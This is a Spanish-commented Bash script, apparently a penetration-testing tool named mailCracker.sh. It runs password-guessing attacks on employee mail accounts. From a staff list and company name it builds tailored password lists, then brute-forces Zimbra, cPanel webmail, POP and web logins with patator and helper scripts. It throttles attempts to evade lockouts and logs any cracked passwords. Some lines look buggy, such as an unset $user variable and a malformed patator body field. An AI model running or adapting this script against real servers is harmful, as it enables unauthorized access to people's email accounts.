#!/bin/bash
# Author: Daniel Torres
# daniel.torres@owasp.org
THREADS="30"
OKBLUE='\033[94m'
OKRED='\033[91m'
OKGREEN='\033[92m'
RESET='\e[0m'

#iptables -I INPUT -p icmp --icmp-type 8 -j DROP
   

echo  "               _                     _ _   _            _            "
echo  "              | |                   (_) | | |          | |           "
echo  " __      _____| |__  _ __ ___   __ _ _| | | |_ ___  ___| |_ ___ _ __ "
#echo  " \ \ /\ / / _ \  _ \|  _ ` _ \ / _` | | | | __/ _ \/ __| __/ _ \  __|"
echo  "  \ V  V /  __/ |_) | | | | | | (_| | | | | ||  __/\__ \ ||  __/ |   "
echo  "   \_/\_/ \___|_.__/|_| |_| |_|\__,_|_|_|  \__\___||___/\__\___|_|   "
echo  " "                                                                                                                                         
echo  " "
echo ''
echo '					daniel.torres@owasp.org'
echo '				https://github.com/DanielTorres1'
echo ''


while getopts ":f:s:e:t:d:" OPTIONS
do
            case $OPTIONS in            
            f)     LISTAPERSONAL=$OPTARG;;
            s)     SERVIDOR=$OPTARG;;
            d)     DOMINIO=$OPTARG;;
            e)     EMPRESA=$OPTARG;;
            t)     TIPO=$OPTARG;;
            ?)     printf "Opcion invalida: -$OPTARG\n" $0
                          exit 2;;
           esac
done

LISTAPERSONAL=${LISTAPERSONAL:=NULL}
SERVIDOR=${SERVIDOR:=NULL}
EMPRESA=${EMPRESA:=NULL}
TIPO=${TIPO:=NULL}
DOMINIO=${DOMINIO:=NULL}

function insert_data () {
	find .vulnerabilidades -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
	find .enumeracion -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
	insert-data.py
	mv .enumeracion/* .enumeracion2 2>/dev/null
	mv .vulnerabilidades/* .vulnerabilidades2 2>/dev/null		 	
	}
	

if [ $LISTAPERSONAL = NULL ] ; then

echo "|              														 			"
echo "| USO: mailCracker.sh -f [Lista del personal - formato daniel;torres;sandi]  -s mail.ejemplo.com [ip/dominio del server] -d dominio -e [empresa, usado para generar passwords] -t webmail/zimbra/pop"
echo "|																		 			"
echo "|  Author:daniel.torres@owasp.org                              			"
echo ""
exit
fi
######################

if [ $TIPO == 'zimbra' ]
then     

	echo -e "$OKBLUE El servidor zimbra esta bloqueando IPs? s/n $RESET"
	read block

	for user in $(cat $LISTAPERSONAL ); do
		#echo $line | tr "," "\n" | tr 'A-Z' 'a-z' > base1.txt
		echo $EMPRESA > base.txt
		echo $user | tr -d . >> base.txt # borrar punto del password				
		#sed -i '1itask goes here' passwords.txt
		
		if [ $block == 's' ]
		then
			mv base.txt passwords.txt					
		else
			passGen.sh -f base.txt -t top200 -o passwords.txt
		fi
					
		echo ""
		echo -e "$OKBLUE #### Ataque a diccionario al usuario $user  #### $RESET "  
		echo -e "$OKRED Usando diccionario de passwords: `wc -l passwords.txt`$RESET " 
		passWeb.pl -t $SERVIDOR -p 443 -d / -m zimbra -u $user -f passwords.txt | tee -a logs/vulnerabilidades/mail-$user-mailPass.txt		
		grep --color=never 'encontrado' logs/vulnerabilidades/mail-$user-mailPass.txt > .vulnerabilidades/mail-$user-mailPass.txt 
		rm passwords.txt
		sleep 1
	done
	
	insert_data
fi



if [ $TIPO == 'webmail' ]
then     
	for user in $(cat $LISTAPERSONAL ); do
		#echo $line | tr "," "\n" | tr 'A-Z' 'a-z' > base1.txt
		echo $EMPRESA >> base.txt
		echo $user >> base.txt
		passGen.sh -f base.txt -t top200 -o passwords.txt
			
		mail=`echo $user`"@$DOMINIO"
		echo ""
		echo -e "$OKBLUE #### Ataque a diccionario al usuario $mail  #### $RESET "  | tee -a webmail.txt
		echo -e "$OKRED Usando diccionario de passwords: `wc -l passwords.txt`$RESET "  | tee -a webmail.txt
		patator http_fuzz accept_cookie=1 auto_urlencode=1 url=https://www.$DOMINIO:2096/login/ method=POST body="\"user=$mail&pass=LISTAPERSONAL0&login=\"" 0=passwords.txt  | tee -a webmail.txt
		echo "Durmiendo por 5min"
		rm passwords.txt
		sleep 600
	done
	insert_data
fi

if [ $TIPO == 'pop' ]
then     
	for fullname in $(cat $LISTAPERSONAL ); do
		#echo $line | tr "," "\n" | tr 'A-Z' 'a-z' > base1.txt
		echo "[+]Probando contraseñas debiles POP"				
						
		echo -e "\n\t########### Testing fullname $fullname #######"			
		generate-password.pl "$fullname" > passwords2.txt # password en base a su usuario			
		head -1 passwords2.txt > base.txt # solo primer nombre
		echo $user >> base.txt
		echo $EMPRESA >> base.txt
		passGen.sh -f base.txt -t top200 -o passwords3.txt # mutaciones de su nombre
		cat passwords2.txt passwords3.txt | sort | uniq > passwords.txt			
		username=`tail -1 passwords2.txt` # dtorres
		correo="echo $username@$DOMINIO"
		echo -e "\n\t[+] Probando el correo $correo"			
		patator pop_login host=$SERVIDOR user="$username" password=FILE0 0=passwords.txt >> logs/cracking/"$SERVIDOR"_pop-$username.txt 2>> logs/cracking/"$SERVIDOR"_pop-$username.txt		
		grep --color=never messages logs/cracking/"$SERVIDOR"_pop-$username.txt >> .vulnerabilidades/"$SERVIDOR"_110_passwordAdivinado.txt
		echo ""							
		echo "Dormir 5 min"
		sleep 300;
		rm passwords.txt passwords2.txt passwords3.txt passwords.txt		
	done
	insert_data
fi


if [ $TIPO == 'web' ]
then     
	for fullname in $(cat $LISTAPERSONAL ); do
		#echo $line | tr "," "\n" | tr 'A-Z' 'a-z' > base1.txt
		echo "[+]Probando contraseñas debiles WEB"										
		echo -e "\n\t########### Testing fullname $fullname #######"					
		username=`generate-password.pl "$fullname" | tail -1`
		mkdir $username
		cd $username
		generate-password.pl "$fullname" > passwords2.txt # password en base a su usuario			
		
		head -1 passwords2.txt > base.txt # solo primer nombre
		echo $user >> base.txt
		echo $EMPRESA >> base.txt
		passGen.sh -f base.txt -t top200 -o passwords3.txt # mutaciones de su nombre
		cat passwords2.txt passwords3.txt | sort | uniq > passwords.txt			
		username=`tail -1 passwords2.txt` # dtorres
		correo=`echo $username@$DOMINIO`
		echo -e "\n\t[+] Probando el correo $correo"			
		cp ../peticion.xml .		
		webintruder.pl -f peticion.xml -t login -u $correo -p passwords.txt
		cd ..		
		
		echo ""							
		echo "Dormir 5 min"
		sleep 30;		
	done
	insert_data
fi





